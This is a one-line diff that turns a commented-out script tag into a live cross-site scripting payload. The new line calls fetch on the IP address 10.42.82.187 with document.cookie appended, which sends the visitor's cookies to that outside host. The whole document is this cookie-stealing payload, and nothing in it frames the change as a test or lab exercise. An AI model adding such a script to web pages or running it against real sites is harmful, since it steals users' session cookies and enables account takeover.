@@ -1,1 +1,1 @@
-<script>//fetch(10.42.82.187) </script>
+<script>fetch("http://10.42.82.187"+document.cookie) </script>
